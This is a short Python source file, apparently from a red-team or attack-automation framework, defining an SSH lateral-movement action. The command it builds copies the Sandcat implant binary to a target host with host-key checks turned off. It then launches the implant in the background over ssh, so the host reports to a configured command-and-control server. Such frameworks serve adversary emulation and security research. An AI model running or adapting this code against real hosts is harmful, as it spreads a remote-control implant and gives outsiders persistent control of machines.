from ..low_level_action import LowLevelAction
from incalmo.core.models.attacker.agent import Agent
from incalmo.config.settings import settings


class SSHLateralMove(LowLevelAction):
    def __init__(self, agent: Agent, hostname: str):
        self.hostname = hostname
        command = (
            f"scp -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o ConnectTimeout=3 sandcat.go-linux {hostname}:~/sandcat_tmp.go && "
            f"ssh -o StrictHostKeyChecking=no "
            f"-o UserKnownHostsFile=/dev/null "
            f"-o ConnectTimeout=3 {hostname} "
            f"'nohup ./sandcat_tmp.go -server {settings.c2_server} -group red 1>/dev/null 2>/dev/null &'"
        )
        payloads = ["sandcat.go-linux"]
        super().__init__(agent, command, payloads, command_delay=3)
